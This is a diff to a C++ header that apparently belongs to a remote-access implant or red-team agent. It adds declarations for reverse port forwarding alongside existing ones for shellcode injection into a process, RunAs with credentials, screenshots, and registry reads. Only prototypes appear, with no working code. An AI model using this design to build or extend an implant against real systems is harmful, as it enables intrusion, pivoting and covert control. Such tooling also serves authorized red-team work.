@@ -62,6 +62,11 @@ namespace Task
         );
     }
 
+    namespace Helper::Rportfwd
+    {
+        void HandleClient(SOCKET client, SOCKET remote);
+    }
+
     namespace Helper::Screenshot
     {
         BOOL InitInstance(HINSTANCE hInstance, INT nCmdShow);
@@ -106,6 +111,8 @@ namespace Task
     std::wstring RegValues(const std::wstring& wRootKey, const std::wstring& wSubKey, BOOL bRecurse);
     std::wstring Rm(const std::wstring& wFile);
     std::wstring Rmdir(const std::wstring& wDir);
+    std::wstring RportfwdAdd(State::StateManager& sm, const std::wstring& wLport, const std::wstring& wIP, const std::wstring& wPort);
+    std::wstring RportfwdRm(const std::wstring& wIP, const std::wstring& wPort);
     std::wstring RunAs(const std::wstring& wUser, const std::wstring& wPassword, const std::wstring& wCmd);
     std::wstring Screenshot(State::StateManager& sm);
     std::wstring Shellcode(State::StateManager& sm, const std::wstring& wPid, const std::wstring& wSrc);
